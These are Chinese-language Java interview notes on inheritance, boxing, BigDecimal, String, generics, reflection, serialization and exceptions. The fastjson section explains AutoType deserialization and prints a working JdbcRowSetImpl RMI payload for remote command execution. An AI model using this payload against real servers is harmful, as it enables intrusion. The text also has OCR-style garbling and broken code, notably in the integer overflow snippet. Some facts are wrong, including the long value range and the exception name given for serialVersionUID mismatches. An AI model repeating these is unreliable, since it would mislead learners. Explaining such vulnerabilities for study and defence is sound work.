# java基础

## 为什么Java不支持多继承

因为如果要实现多继承，就会像C++中一样，存在菱形继承的问题，C++为了解决菱形继承问题，又引入了虚继承。

除了菱形的问题，支持多继承复杂度也会增加。一个类继承了多个父类，可能会继承大量的属性和方法导致类的接口变得庞大、难以理解和维护。此外，在修改一个父类时，可能会影响到多个子类，增加了代码的耦合度。

Java支持同时实现多个接口，这就相当于通过implements就可以从多个接口中继承到多个方法了，但是，Java8中为了避免萎形继承的问题，在实现的多个接口中如果有相同方法，就会要求该类必须重写这个方法。

Java不支持多继承，但是是支持多实现的，也就是说，同一个类可以同时实现多个接口。

我们知道，在Java 8以前，接口中是不能有方法的实现的。Java 8中支持了默认函数(default method)，即接口中可以定义一个有方法体的方法了。
多实现后，子类必须重写方法，不然编译错误。

## 接口和抽象类的区别，如何选择？

方法定义:
接口和抽象类，最明显的区别就是接口只是定义了一些方法而已，在不考虑Java8中default方法情况下，接口中只有抽象方法，是没有实现的代码的。(
Java8中可以有默认方法)

修饰符:抽象类中的修饰符可以有public、protected和private和<default>
这些修饰符，而接口中默认修饰符是public。不可以使用其它修饰符。(接口中，如果定义了成员变量，还必须要初始化)

构造器:抽象类可以有构造器。接口不能有构造器

继承和实现:接口可以被实现，抽象类可以被继承

单继承，多实现:一个类可以实现多个接口，但只能继承一个抽象类。接口支持多重继承，即一个接口可以继承多个其他接口。

职责不同:接口和抽象类的职责不一样。接口主要用于制定规范，因为我们提倡也经常使用的都是面向接口编程。而抽象类主要目的是为了复用，比较典型的就是模板方法模式。

所以当我们想要定义标准、规范的时候，就使用接口。当我们想要复用代码的时候，就使用抽象类。

## 如何理解Java中的多态？

多态就是同一操作作用于不同的对象，可以有不同的解释，产生不同的执行结果。

如果按照这个概念来定义的话，那么多态应该是一种运行期的状态。为了实现运行期的多态，或者说是动态绑定，需要满足三个条件:

- 有类继承或者接口实现。
- 子类要重写父类的方法。
- 父类的引用指向子类的对象。

## 方法重载和重写

重载是就是函数或者方法有同样的名称，但是参数列表不相同的情形，这样的同名不同参数的函数或者方法之间，互相称之为重载函数或者方法。

重写指的是在Java的子类与父类中有两个名称、参数列表都相同的方法的情况。由于他们具有相同的方法签名，所以子类中的新方法将覆盖父类中原有的方法。

## Java中有了基本类型为什么还需要包装类？

| 分类  | 基本数据类型  |    包装     | 长度  |                   表示范围 |
|:----|:-------:|:---------:|:---:|-----------------------:|
| 布尔型 | boolean |  Boolean  | 1字节 |                      - |
| 整型  |  byte   |   Byte    | 1字节 |               -128到127 |
| 整型  |  short  |   Short   | 2字节 |           -32768到32767 |
| 整型  |   int   |  Integer  | 4字节 | -2147483648到2147483647 |
| 整型  |  long   |   Long    | 8字节 |           -2^32-2^32-1 |
| 字符型 |  char   | Character | 2字节 |        Unicode字符集中任何字符 |
| 浮点型 |  float  |   Float   | 4字节 |         -3.4E38到3.4E38 |
| 浮点型 | double  |  Double   | 8字节 |       -1.7E308到1.7E308 |

因为Java是一种面向对象语言，很多地方都需要使用对象而不是基本数据类型比如，在集合类中，我们是无法将int、double等类型放进去的。因为集合的容器要求元素是Object类型。

基本类型和包装类型的区别
1.默认值不同，基本类型的默认值为0,false或\u0000等，包装类默认为nul
2.初始化方式不同，一个需要new，一个不需要
3.存储方式不同，基本类型保存在栈上，包装类对象保存在堆上(成员变量的话，在不考虑JT优化的栈上分配时，都是随着对象一起保存在堆上的)

在Java SE 5中，为了减少开发人员的工作，Java提供了自动拆箱与自动装箱功能。
自动装箱: 就是将基本数据类型自动转换成对应的包装类，
自动拆箱:就是将包装类自动转换成对应的基本数据类型
自动装箱都是通过包装类的 value0f()方法来实现的.自动拆箱都是通过包装类对象的 xxxValue()来实现的，
如:int的自动装箱都是通过Integer.value0f()方法来实现的，Integer的自动拆箱都是通过 Integer.intValue()来实现的。

**自动拆装箱与缓存**

```java
public static void main(String... strings) {
    Integer i1 = 3;
    Integer i2 = 3;
    Integer i3 = 300;
    Integer i4 = 300;
    
    System.out.println(i1 == i2);//true
    System.out.println(i3 == i4);//false
}
```
我们普遍认为上面的两个判断的结果都是false。
虽然比较的值是相等的，但是由于比较的是对象，而对象的引用不一样，所以会认为两个if判断都是false的。
在Java中，==比较的是对象引用，而equals比较的是值。
所以，在这个例子中不同的对象有不同的引用，所以在进行比较的时候都将返回false。
奇怪的是，这里两个类似的if条件判断返回不同的布尔值。

原因就和Integer中的缓存机制有关。
在Java5中，在Integer的操作上引入了一个新功能来节省内存和提高性能。
整型对象通过使用相同的对象引用实现了缓存和重用。

我们只需要知道，当需要进行自动装箱时，如果数字在-128至127之间时，会直接使用缓存中的对象，而不是重新创建一个对象。

其中的javadoc详细的说明了缓存支持-128到127之间的自动装箱过程。最大值127可以通过-XX:AutoBoxCacheMax=size 修改。

实际上这个功能在Java 5中引入的时候,范围是固定的-128 至 +127。后来在Java 6中，可以通过 java.lang.Integer.IntegerCache.high 设置最大值。

这使我们可以根据应用程序的实际情况灵活地调整来提高性能，到底是什么原因选择这个-128到127范围呢?因为这个范围的数字是最被广泛使用的。在程序中，第一次使用Integer的时候也需要一定的额外时间来初始化这个缓存。


## 为什么不能用浮点数表示金额？

因为不是所有的小数都能用二进制表示(扩展知识中介绍为啥不能表示)，所以，为了解决这个问题，IEEE提出了一种使用近似值表示小数的方式，并且引入了精度的概念。这就是我们所熟知的浮点数

比如0.1+0.2!=0.3，而是等于0.30000000000000004(甚至有一个网站就叫做 https://0.30000000000000004.com/，就是来解释这个现象的)

所以，浮点数只是近似值，并不是精确值，所以不能用来表示金额。否则会有精度丢失。

在Java中，使用float表示单精度浮点数，double表示双精度浮点数，表示的都是近似值。
所以，在Java代码中，千万不要使用float或者double来进行高精度运算，尤其是金额运算，否则就很容易产生资损问题。
为了解决这样的精度问题，Java中提供了BigDecimal来进行精确运算

## 为什么不能用BigDecimal的equals方法做等值比较？

因为BigDecimal的equals方法和compareTo并不一样，equals方法会比较两部分内容，分别是值(value)和标度(scale)，而对于0.1和0.10这两个数字，他们的值虽然一样，但是精度是不一样的，所以在使用equals比较的时候会返回false。

因为BigDecimal是对象，所以不能用 == 来判断两个数字的值是否相等。

```java
BigDecimal b1 = new BigDecimal(1);
BigDecimal b2 = new BigDecimal(1);
BigDecimal b3 = new BigDecimal(1.0);
BigDecimal b4 = new BigDecimal("1");
BigDecimal b5 = new BigDecimal("1.0");
System.out.println(b1.equals(b2));//true
System.out.println(b1.equals(b3));//true
System.out.println(b1.equals(b4));//true
System.out.println(b4.equals(b5));//false
```
首先，最简单的就是BigDecimal(long)和BigDecimal(int)，因为是整数，所以标度就是0;

对于BigDecimal(double)，当我们使用new BigDecimal(0.1)创建一个BigDecimal 的时候，其实创建出来的值并不是整好等于0.1的，而是0.1000000000000000055511151231257827021181583404541015625这是因为double自身表示的只是一个近似值。

而对于BigDecimal(String)当我们使用new BigDecimal("0.1”)创建一个BigDecimal 的时候，其实创建出来的值正好就是等于0.1的。那么他的标度也就是1。
如果使用new BigDecimal("0.10000")，那么创建出来的数就是0.10000，标度也就是5。 
所以，因为BigDecimal("1.0")和BigDecimal("1.00")的标度不一样，所以在使用equals方法比较的时候，得到的结果就是false。

BigDecimal中提供了compareTo方法，这个方法就可以只比较两个数字的值如果两个数相等，则返回0。
```java
BigDecimal b6 = new BigDecimal("1.0");
BigDecimal b7 = new BigDecimal("1.00");
System.out.println(b6.equals(b7));//false
System.out.println(b6.compareTo(b7)); //两个数相等，返回0
```

## 为什么对Java中的负数取绝对值结果不一定是正数？

整型中，每个类型都有一定的表示范围，但是，在程序中有些计算会导致超出表示范围，即溢出。

```java
nti= Integer.MAX VALUE; 
intj= Integer.MAX VALUE; 
int k =i +System.out.println("i(" +i+ ")+j("+j+ ")= k ("+ k + ")");
```
输出结果:i(2147483647)+j(2147483647)=k(-2)

这就是发生了溢出，溢出的时候并不会抛异常，也没有任何提示。
所以，在程序中，使用同类型的数据进行运算的时候，一定要注意数据溢出的问题。

## String、StringBuilder和StringBuffer的区别？

String是不可变的，StringBuilder和StringBuffer是可变的。而StringBuffer是线程安全的，而StringBuilder是非线程安全的。

Java中的+对字符串的拼接，其实现原理是使用StringBuilder.append
不要在for循环中使用+拼接字符串,在 for循环中，每次都是new了一个StringBuilder，然后再把String 转成 StringBuilder ，再进行append。

## String为什么设计成不可变的？

1.缓存：字符串是使用最广泛的数据结构。大量的字符串的创建是非常耗费资源的，所以，Java提供了对字符串的缓存功能，可以大大的节省堆空间。 JVM中专门开辟了一部分空间来存储Java字符串，那就是字符串池。 通过字符串池，两个内容相同的字符串变量，可以从池中指向同一个字符串对象，从而节省了关键的内存资源。
2.安全性：字符串在Java应用程序中广泛用于存储敏感信息，如用户名、密码、连接ur、网络连接等。JVM类加载器在加载类的时也广泛地使用它。 因此，保护String类对于提升整个应用程序的安全性至关重要。 当我们在程序中传递一个字符串的时候，如果这个字符串的内容是不可变的，那么我们就可以相信这个字符串中的内容。 但是，如果是可变的，那么这个字符串内容就可能随时都被修改。那么这个字符串内容就完全不可信了。这样整个系统就没有安全性可言了。
3.线程安全：不可变会自动使字符串成为线程安全的，因为当从多个线程访问它们时，它们不会被更改。 因此，一般来说，不可变对象可以在同时运行的多个线程之间共享。它们也是线程安全的，因为如果线程更改了值，那么将在字符串池中创建一个新的字符串，而不是修改相同的值。因此，字符串对于多线程来说是安全的。
4.hashcode缓存：由于字符串对象被广泛地用作数据结构，它们也被广泛地用于哈希实现，如HashMap、HashTable、HashSet等。在对这些散列实现进行操作时，经常调用hashCode()方法。 不可变性保证了字符串的值不会改变。因此，hashCode()方法在String类中被重写，以方便缓存，这样在第一次hashCode()调用期间计算和缓存散列，并从那时起返回相同的值。

## String str=new String("abc")创建了几个对象？

创建的对象数应该是1个或者2个
首先要清楚什么是对象?
Java是一种面向对象的语言，而Java对象在JVM中的存储也是有一定的结构的在HotSpot虚拟机中，存储的形式就是oop-klass model，即Java对象模型。
我们在Java代码中，使用new创建一个对象的时候，IVM会创建一个instanceOopDesc对象，这个对象中包含了两部分信息，对象头以及元数据。对象头中有一些运行时数据，其中就包括和多线程相关的锁的信息。元数据其实维护的是指针，指向的是对象所属的类的instanceKlass。
这才叫对象。其他的，一概都不叫对象。
那么不管怎么样，一次new的过程，都会在堆上创建一个对象，那么就是起码有一个对象了。至于另外一个对象，到底有没有要看具体情况了。
另外这一个对象就是常量池中的字符串常量，这个字符串其实是类编译阶段就进到Class常量池的，然后在运行期，字符串常量在第一次被调用(准确的说是Idc指令)的时候，进行解析并在字符串池中创建对应的String实例的。

所以，如果是第一次执行，那么就是会同时创建两个对象。一个字符串常量引用指向的对象，一个我们new出来的对象。
![img.png](img.png)
如果不是第一次执行，那么就只会创建我们自己new出来的对象，
![img_1.png](img_1.png)


## intern

当一个 String 实例调用 intern()方法时，Java查找常量池中是否有相同Unicode的字符串常量，如果有，则返回其的引用，如果没有，则在常量池中增加一个Unicode等于str的字符串并返回它的引用

intern()有两个作用，第一个是将字符串字面量放入常量池(如果池没有的话)，第二个是返回这个常量的引用。

不知道，你有没有发现，在Strings3=newString(“Hollis").intern();中，其实 intern 是多余的?
因为就算不用 intern ，Hollis作为一个字面量也会被加载到Class文件的常量池，进而加入到运行时常量池中，为啥还要多此一举呢?到底什么场景下才需要使用 intern 呢?

很多时候，我们在程序中得到的字符串是只有在运行期才能确定的，在编译期是无法确定的，那么也就没办法在编译期被加入到常量池中。
这时候，对于那种可能经常使用的字符串，使用 intern 进行定义，每次JVM运行到这段代码的时候，就会直接把常量池中该字面值的引用返回，这样就可以减少大量字符串对象的创建了.

```java
String s1 = new String("a");
s1.intern();
String s2 = "a";
System.out.println(s1 == s2); // false

String s3 = new String("a") + new String("a");
s3.intern();
String s4 = "aa";
System.out.println(s3 == s4);  //true
```
字面量"a"在第一行就进入了字符串池，所以直接返回原来的引用，s2指向常量池中的"a"
s3并没有进入字符串池，执行了intern后，s3指向引用放入字符串常量池，s4也直接获得引用


## 常见的字符编码有哪些？有什么区别？

Unicode：万国码，是计算机科学领域里的一项业界标准。对世界大部分的文字进行了整理、编码，使得计算机用更为简单的方式来呈现和处理文字。
Unicode虽然统一了全世界字符编码，但是为规定如何存储，比如英语字母在ASCII中都有，用1个字节表示，剩余字节填充0会造成极大的浪费，因此出现了中间格式字符集，成为通用转换格式即UTF-8

UTF-8使用1-4字节为每个字符编码
UTF-8和UTF-16都是Unicode的一种实现方式。

由于先纳入的字节使用了1-2字节，晚纳入的字节占了3-4字节，对于常用汉字，采用了3字节编码，但是只包含中文和ASCII编码的话，2字节就够了，因此有了GBK编码


## 什么是泛型？有什么好处？

Java泛型(generics)是IDK5中引入的一个新特性，允许在定义类和接口的时候使用类型参数(type parameter)。
声明的类型参数在使用时用具体的类型来替换。泛型最主要的应用是在JDK5中的新集合类框架中。

好处：
1. 方便:可以提高代码的复用性。以List接口为例，我们可以将String、Integer等类型放入List中，如不用泛型，存放String类型要写一个List接口存放Integer要写另外一个List接口，泛型可以很好的解决这个问题
2. 安全:在泛型出之前，通过Obiect实现的类型转换需要在运行时检查，如果类型转换出错，程序直接GG，可能会带来毁灭性打击。而泛型的作用就是在编译时做类型检查，这无疑增加程序的安全性

Java中的泛型通过类型擦除的方式来实现。
通俗点理解，就是通过语法糖的形式，在java->.class转换的阶段，将List<String>擦除调转为List的手段。
换句话说，Java的泛型只在编译期，Jvm是不会感知到泛型的。

类型擦除可以简单的理解为将泛型java代码转换为普通java代码，只不过编译器更直接点，将泛型java代码直接转换成普通java字节码。

类型擦除缺点：

1. 泛型不能重载
2. 泛型异常类不能多次catch
3. 泛型类的静态变量只有一份，不会多份

E - Element、T - Type、K - Key、V - Value、N - Number


## 概述下**List<?>**与**List**区别

区别：
1. List<?>是一个未知类型的List，List<Object>是任意类型的List，可以把List<String>赋值给List<?>，但不能赋值给List<Object>
2. 可以把任何带参数的类型传递给原始类型List，但不支持List<Object>
3. List<?>不能添加出了null之外的任何元素

对于数组协变和泛型非协变的理解
所谓协变，可以简单理解为因为Object是String的父类，所以Object同样是String[的父类，这种情况Java是允许的;
但是对于泛型来说，List<Object>和List<String>半毛钱关系都没有


## API和SPI有啥区别

API-是直接被应用开发人员使用，定义了软件组件之间交互的规则和约定的接口。

SPI-是被框架扩展人员使用，通常用于在应用程序提供可插拔的实现，调用方可选择使用提供方内置的实现

SPI的应用场景

概括地说，适用于:调用者根据实际使用需要，启用、扩展、或者替换框架的实现策略。比较常见的例子:

1. 数据库驱动加载接口实现类的加载
2. JDBC加载不同类型数据库的驱动
3. 日志门面接口实现类加载
4. SLF4J加载不同提供商的日志实现类


## 什么是反射机制？为什么反射慢？

反射机制指的是程序在运行时能够获取自身的信息。在java中，只要给定类的名字，那么就可以通过反射机制来获得类的所有属性和方法。

Java的反射可以:

1. 在运行时判断任意一个对象所属的类
2. 在运行时判断任意一个类所具有的成员变量和方法
3. 在运行时任意调用一个对象的方法
4. 在运行时构造任意一个类的对象

```java
Object obj = ...;
Class<?> clazz = obj.getClass();

Method[] methods = clazz.getDeclaredMethods();
Method method = clazz.getDeclaredMethod("methodName", 方法参数类型);
method.setAccessible(true);
method.invoke(obj, 方法参数);

Object o = clazz.newInstance();
Constructor<?> constructor = clazz.getConstructor(参数类型);
Object o1 = constructor.newInstance(构造函数参数);
```

反射的好处就是可以提升程序的灵活性和扩展性，比较容易在运行期干很多事情。但是他带来的问题更多，主要由以下几个:

1. 代码可读性低及可维护性
2. 反射代码执行的性能低
3. 反射破坏了封装性

所以，我们应该在业务代码中应该尽量避免使用反射。但是，作为一个合格的Java开发，也要能读懂中间件、框架中的反射代码。在有些场景下，要知道可以使用反射解决部分问题

反射慢的主要原因：

1. 由于反射涉及动态解析的类型，因此不能执行某些Java虚拟机优化，如JT优化。
2. 在使用反射时，参数需要包装(boxing)成Object[]类型，但是真正方法执行的时候，又需要再拆包(unboxing)成真正的类型，这些动作不仅消耗时间而且过程中也会产生很多对象，对象一多就容易导致GC，GC也会导致应用变慢。
3. 反射调用方法时会从方法数组中遍历查找，并且会检查可见性。这些动作都是耗时的。
4. 不仅方法的可见性要做检查，参数也需要做很多额外的检查

反射常用场景

1. 动态代理
2. JDBC的class.forName
3. BeanUtils中属性值的拷贝
4. RPC框架
5. ORM框架
6. Spring的IOC/DI

反射和Class的关系

Java的Class类是java反射机制的基础,通过Class类我们可以获得关于一个类的相关信息

Java.lang.Class是一个比较特殊的类，它用于封装被装入到IVM中的类(包括类和接口)的信息。当一个类或接口被装入到IVM时便会产生一个与之关联的java.lang.Class对象，可以通过这个Class对象对被装入类的详细信息进行访问虚拟机为每种类型管理一个独一无二的Class对象。也就是说，每个类(型)都有一个Class对象。运行程序时，Java虚拟机(VM)首先检查是否所要加载的类对应的Class对象是否已经加载。如果没有加载，M就会根据类名查找.class文件并将其Class对象载入。

## Java中创建对象有哪些种方式

1. new
2. 使用反射Class类中的newInstance方法，或者Constructor类中newInstance方法
3. clone方法，需要实现cloneable接口
4. 反序列化 new ObjectOutputStream(new FileOutputStream("..."))
5. 方法句柄，MethodType.methodType(void.class).lookup().finConstructor(User.class)
6. 使用Unsafe分配内存和对象实例化，但不建议在生产环境使用。


## Java的动态代理如何实现？

在Java中，实现动态代理有两种方式:
1. JDK动态代理:Java.lang.reflect 包中的Proxy类和InvocationHandler接囗提供了生成动态代理类的能力。
2. Cglib动态代理:Cglib(Code Generation Library )是一个第三方代码生成类库，运行时在内存中动态生成一个子类对象从而实现对目标对象功能的扩展。

区别：

JDK的动态代理有一个限制，就是使用动态代理的对象必须实现一个或多个接口。如果想代理没有实现接口的类，就可以使用CGLIB实现。

Cglib是一个强大的高性能的代码生成包，它可以在运行期扩展Java类与实现Java接口。它广泛的被许多AOP的框架使用，例如SpringAOP和dynaop，为他们提供方法的interception(拦载)。

Cglib包的底层是通过使用一个小而快的字节码处理框架ASM，来转换字节码并生成新的类。不鼓励直接使用ASM，因为它需要你对JVM内部结构包括class文件的格式和指令集都很熟悉，

所以，使用JDK动态代理的对象必须实现一个或多个接口;而使用cglib代理的对象则无需实现接口，达到代理类无侵入。

Java的动态代理的最主要的用途就是应用在各种框架中。因为使用动态代理可以很方便的运行期生成代理类，通过代理类可以做很多事情，比如AOP，比如过滤器、拦截器等。

## 注解的作用

Java 注解用于为 Java 代码提供元数据。作为元数据，注解不直接影响你的代码执行，但也有一些类型的注解实际上可以用于这一目的。Java 注解是从 Java5 开始添加到 Java 的。

Java的注解，可以说是一种标识，标识一个类或者一个字段，常常是和反射AOP结合起来使用。中间件一般会定义注解，如果某些类或字段符合条件，就执行某些能力。

@Retention：指定被修饰的注解的生命周期，即注解在源代码、编译时还是运行时保留。它有三个可选的枚举值:SOURCE、CLASS和RUNTIME。默认为CLASS。

@Target：指定被修饰的注解可以应用于的元素类型，如类、方法、字段等。这样可以限制注解的使用范围，避免错误使用，

@Documented：用于指示注解是否会出现在生成的Java文档中。如果一个注解被@Documented元注解修饰，则该注解的信息会出现在API文档中，方便开发者查阅。

@Inherited：指示被该注解修饰的注解是否可以被继承。默认情况下，注解不会被继承，即子类不会继承父类的注解。但如果将一个注解用@Inherited修饰，那么它就可以被子类继承。


## java序列化的原理是啥

序列化是将对象转换为可传输格式的过程。是一种数据的持久化手段。一般广泛应用于网络传输，RMI和RPC等场最中。
几乎所有的商用编程语言都有序列化的能力，不管是数据存储到硬盘，还是通过网络的微服务传输，都需要序列化能力。

在Java的序列化机制中，如果是String，枚举或者实现了Serializable接口的类均可以通过Java的序列化机制，将类序列化为符合编码的数据流，然后通过InputStream和OutputStream将内存中的类持久化到硬盘或者网络中;同时也可以通过反序列化机制将磁盘中的字节码再转换成内存中的类。

如果一个类想被序列化，需要实现Serializable接口。否则将抛出NotSerializableException异常。
Serializable接口没有方法或字段，仅用于标识可序列化的语义。

> Serializable与Externalizable的区别

Externalizable继承了Serializable，该接口中定义了两个抽象方法:writeExternal0)与readExternal()。
当使用Externalizable接口来进行序列化与反序列化的时候需要开发人员重写writeExternal0)与readExternal()方法。
如果没有在这两个方法中定义序列化实现细节，那么序列化之后，对象内容为空。
实现Externalizable接口的类必须要提供-个public的无参的构造器。
所以，实现Externalizable，并实现writeExternal()和readExternal()方法可以指定序列化哪些属性。

> java中有哪些序列化的框架？

Java中常用的序列化框架：java、kryo、hessian、protostuff、gson、fastjson等

1. Kry0:速度快，序列化后体积小;跨语言支持较复杂
2. Hessian:默认支持跨语言;效率不高
3. Protostuff:速度快，基于protobuf;需静态编译
4. Protostuff-Runtime:无需静态编译，但序列化前需预先传入schema;不支持无默认构造函数的类，反序列化时需用户自己初始化序列化后的对象，其只负责将该对象进行赋值
5. Java:使用方便，可序列化所有类;速度慢，占空间

> serialVersionUID有啥用？

序列化是将对象的状态信息转换为可存储或传输的形式的过程。Java对象是保存在堆内存中的，如果堆不存在了，那么对象也就跟着消失了，而序列化提供了一种方案，可以让你在即使JVM停机的情况下也能把对象保存下来的方案。就像我们平时用的U盘一样。

把Java对象序列化成可存储或传输的形式(如二进制流)，比如保存在文件中。这样，当再次需要这个对象的时候，从文件中读取出二进制流，再从二进制流中反序列化出对象。
但是，虚拟机是否允许反序列化，不仅取决于类路径和功能代码是否一致，一个非常重要的一点是两个类的序列化ID是否一致，即serialVersionUID要求一致。

在进行反序列化时，JVM会把传来的字节流中的serialVersionUID与本地相应实体类的serialVersionUID进行比较，如果相同就认为是一致的，可以进行反序列化，否则就会出现序列化版本不一致的异常，即是InvalidCastException。这样做是为了保证安全，因为文件存储中的内容可能被篡改。

当实现java.io.Serializable接囗的类没有显式地定义一个serialVersionUID变量时候，Java序列化机制会根据编译的Class自动生成一个serialVersionUID作序列化版本比较用，这种情况下，如果Class文件没有发生变化，就算再编译多次serialVersionUID也不会变化的。但是，如果发生了变化，那么这个文件对应的serialVersionUlD也就会发生变化。

基于以上原理，如果我们一个类实现了Serializable接口，但是没有定义serialVersionUID，然后序列化。在序列化之后，由于某些原因，我们对该类做了变更，重新启动应用后，我们相对之前序列化过的对象进行反序列化的话就会报错。

> fastjson的反序列化漏洞

当我们使用fastjson进行序列化的时候，当一个类中包含了一个接口(或抽象类)的时候，会将子类型抹去，只保留接口(抽象类)的类型，使得反序列化时无法拿到原始类型。

那么为了解决这个问题，fastjson引入了AutoType，即在序列化的时候，把原始类型记录下来。

因为有了AutoType功能，那么fastjson在对JSON字符串进行反序列化的时候，就会读取`@type`到内容，试图把JSON内容反序列化成这个对象，并且会调用这个类的setter方法。

那么这个特性就可能被利用，攻击者自己构造一个JSON字符串，并且使用`@type`指定一个自己想要使用的攻击类库实现攻击。

举个例子，黑客比较常用的攻击类库是`com.sun.rowset.JdbcRowSetlmpl`，这是sun官方提供的一个类库，这个类的dataSourceName支持传入一个rmi的源，当解析这个uri的时候，就会支持rmi远程调用去指定的rmi地址中去调用方法
而fastison在反序列化时会调用目标类的setter方法，那么如果黑客在JdbcRowSetlmpl的dataSourceName中设置了一个想要执行的命令，那么就会导致很严重的后果，
如通过以下方式定一个JSON串，即可实现远程命令执行(在早期版本中，新版本中JdbcRowSetlmpl已经被加了黑名单)
```json
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://localhost:1099/Exploit","autoCommit":true}
```

这就是所谓的远程命令执行漏洞，即利用漏洞入侵到目标服务器，通过服务器执行命令。


## Java中异常分哪两类，有什么区别

检验时异常(Checked Exception)和运行时异常(Runtime Exception)

对于受检异常来说，如果一个方法在声明的过程中证明了其要有受检异常抛出:
```java
public void test()throws Exception{}
```
那么，当我们在程序中调用他的时候，一定要对该异常进行处理(捕获或者向上抛出)，否则是无法编译通过的。这是一种强制规范。

这种异常在IO操作中比较多。比如FileNotFoundException，当我们使用IO流处理一个文件的时候，有一种特殊情况，就是文件不存在，所以，在文件处理的接口定义时他会显示抛出FileNotFoundException，起目的就是告诉这个方法的调用者，我这个方法不保证一定可以成功，是有可能找不到对应的文件的，你要明确的对这种情况做特殊处理哦。

对于Runtime Exception不需要显示的捕获，通常在运行的时候报错，会中断程序的执行，通常是代码原因导致的，比如数组越界、空指针等。因此可以避免。

> 举例几个常见的RuntimeException

AnnotationTypeMismatchException, ArithmeticException, ArrayStoreExceptionBufferOverflowException, 
BufferUnderflowException, CannotRedoException,CannotUndoException, ClassCastException, CMMException, 
ConcurrentModificationException,DataBindingException,DOMException, EmptyStackException,
EnumConstantNotPresentException, EventException, FileSystemAlreadyExistsException, 
FileSystemNotFoundException, lllegalArgumentException, lllegalMonitorStateException,
llegalPathStateException, lllegalStateException, lllformedLocaleException,ImagingOpException, 
IncompleteAnnotationException, IndexOutOfBoundsException,JMRuntimeException, LSException, 
MalformedParameterizedTypeException,MirroredTypesException, MissingResourceException, 
NegativeArraySizeException,NoSuchElementException, NoSuchMechanismException, NullPointerException,
ProfileDataException, ProviderException, ProviderNotFoundException, RasterFormatException,
RejectedExecutionException, SecurityException, SystemException, TypeConstraintException,
TypeNotPresentException, UndeclaredThrowableException, UnknownEntityException,
UnmodifiableSetException, UnsupportedOperationException, WebServiceException, WrongMethodTypeException


> 说几个java异常处理的关键词及其用法

throws、throw、try、catch、finally
1. try用来指定一块预防所有异常的程序;
2. catch子句紧跟在try块后面，用来指定你想要捕获的异常的类型
3. finally为确保一段代码不管发生什么异常状况都要被执行;
4. throw语句用来明确地抛出一个异常;
5. throws用来声明一个方法可能抛出的各种异常:

> 什么是自定义异常？如何使用

自定义异常就是开发人员自己定义的异常，一般通过继承Exception的子类的方式实现。

编写自定义异常类实际上是继承一个API标准异常类，用新定义的异常处理信息覆盖原有信息的过程。

这种用法在Web开发中也比较常见，一般可以用来自定义业务异常。
如余额不足、重复提交等。这种自定义异常有业务含义，更容易让上层理解和处理。


## 为什么不建议使用异常控制业务流程

在《Effective Java》中，作者提出过，不建议使用异常来控制业务流程。很多人 不理解，啥叫用异常控制业务流程。

给大家举个简单的例子，在解决幂等问题时，我们有的人会这么做，先插入，然后再捕获唯一性约束冲突异常，再反查，返回幂等。如:

```java
public void insertData(Data data) {
    try {
        dataRepository.insert(data);
    } catch (DuplicateKetException e) {
        Data exist = dataRepository.findByUniquekey(data.getUniqueKey());
        return exist;
    }
}
```
这么做非常不建议，主要由以下几个问题:

1. 存在性能问题:在Java中，异常的生成和处理是昂贵的，因为它涉及到填充栈跟踪信息。频繁地抛出和捕获异常会导致性能下降。
2. 异常的职责就不是干这个的:Java中的异常被定义来处理一些非正常情况的，他的使用应该是比较谨慎的，异常应该用于处理非预期的错误情况，而不是利用它来控制正常的业务流程。使用异常控制业务流程会使代码的意图变得不清晰，增加了理解和维护代码的难度。
3. 异常的捕获会影响事务的回滚:这里代码很简单，可能不涉及到事务，但是如果本身这个方法还有很多其他的数据库操作逻辑，或者方法外嵌套了一层方法，那么就会可能会出现，因为异常被捕获而导致的事务无法回滚。
4. 过度依赖底层数据库异常:这里过度的依赖了DuplicateKeyException，万一哪一天这个异常发生了改变，比如版本升级了，或者底层数据库变了，不再抛出这个异常了，那这段代码就会失去作用，可能会导致意想不到的问题，

还有一点，那就是良好的API设计应该清晰地表达意图。如果API使用异常来表示常规的业务流程控制这可能会误导API的使用者，使他们误解API的真正用途，
所以，不建议大家过度的使用异常，并且非常不建议使用异常来控制你的业务流程

前面提到的幂等问题，要解决幂等问题，应该是先查，再改。如果为了防止并发，应该是一锁、二判、三更新。


## 以下关于异常处理的代码有哪些问题

```java
public class Main {
    public static void main(String[] args) throws IllegalAccessException, InstantiationException {
        BufferedReader br = null;
        try {
            String line;
            br = new BufferedReader(new FileReader(("...")));
            while ((line = br.readLine()) != null) {
                start();
            }
            return;
        } catch (Exception ex) {
            ex.printStackTrace();
        }catch (RuntimeException re) {
            re.printStackTrace();
        } finally {
            System.out.println("1");
        }
    }
    
    public static void start() throws IOException, RuntimeException {
        throw new RuntimeException("not able to start");
    }
    
}
```

1. `#start`方法不会发生I0Exception，所以不需要throw
2. RuntimeException不需要显式的throw
3. catch的时候，要先从子类开始catch，代码中catch的顺序不对
4. 没有关闭流
5. return之前的finally block是会被执行的

上述代码如何优化？

```java
public static void main(String[] args){
    try (BufferedReader br = new BufferedReader(new FileReader(("...")))) {
        String line;
        while ((line = br.readLine()) != null) {
            start();
        }
        return;
    } catch (IOException ex) {
        ex.printStackTrace();
    }
}
```

## finally中的代码一定会执行吗

通常情况下，finally的代码一定会被执行，但是这是有一个前提的，
1. 对应 try 语句块被执行
2. 程序正常运行。

如果没有符合这两个条件的话，finally中的代码就无法被执行，如发生以下情况，都会导致finally不会执行:
1. System.exit()方法被执行
2. Runtime.getRuntime0.halt0)方法被执行
3. try或者catch中有死循环
4. 操作系统强制杀掉了JVM进程，，如执行了kil -9
5. 其他原因导致的虚拟机崩溃了
6. 虚拟机所运行的环境挂了，如计算机电源断了
7. 如果一个finally是由守护线程执行的，那么是不保证一定能执行的，如果这时候M要退出，IM会检查其他非守护线程，如果都执行完了，那么就直接退出了。这时候finally可能就没办法执行完

> final/finally/finalize三者区别

final:是一个关键字，用于声明变量、方法或类，使之不可变、不可重写或不可继承。

finally:是异常处理的一部分，用于确保代码块(通常用于资源清理)总是执行。

finalize:是Object类的一个方法，用于在对象被垃圾回收前执行清理操作，但通常不推荐使用。

> finally与return之间的关系

finally总是在try-catch之后执行，不论异常是否发生，finally中的return语句可以覆盖掉try-catch中任何return语句

```
public static String getValue(){
    try{
        return "A";
    }catch (Exception e){
        return "B";
    }finally {
        return "C";
    }
}
```
不管是否有异常，都是只返回C。

如果finally块中有return语句，则其返回值将是整个try-catch-finally结构的返回值。
如果finally块中没有return语句，则try或catch块中的return语句(取决于哪个执行了)将确定最终的返回值。


